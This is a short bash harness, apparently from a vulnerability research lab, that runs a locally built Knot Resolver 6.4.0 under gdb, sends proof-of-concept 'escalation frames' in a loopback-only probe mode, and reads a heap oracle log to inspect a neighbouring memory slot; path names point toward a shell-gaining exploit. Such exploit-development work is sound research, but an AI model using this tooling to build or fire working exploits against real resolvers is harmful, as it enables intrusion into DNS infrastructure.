#!/bin/bash
# Loopback-only. Start 6.4.0 jemalloc build under gdb, send the five PoC
# escalation frames (probe mode: no OOB write), read the live neighbour slot.
set +e
BASE=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/knotresolver2shell
KRESD="$BASE/build/knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd"
LOG="$BASE/harness/jemalloc-oracle.txt"
: > "$LOG"
gdb -q -batch -x "$BASE/harness/jemalloc-oracle.gdb" "$KRESD" \
  > "$BASE/harness/jemalloc-gdb-stdout.log" 2>&1 &
GB=$!
echo "[runner] gdb pid=$GB"
sleep 5
echo "=== listener check ==="
ss -lun | grep 8855 || echo "no 8855 socket yet"
echo "=== probe frames ==="
"$BASE/poc/venv/bin/python" "$BASE/poc/knot-doq/poc.py" probe --port 8855 2>&1
sleep 3
kill -9 $GB 2>/dev/null
pkill -9 -f 'knot-resolver-6.4.0-jemalloc/jemalloc-build/daemon/kresd' 2>/dev/null
sleep 1
echo "=== oracle ==="
cat "$LOG"
echo "=== gdb stdout tail ==="
tail -20 "$BASE/harness/jemalloc-gdb-stdout.log"
echo "=== END ==="
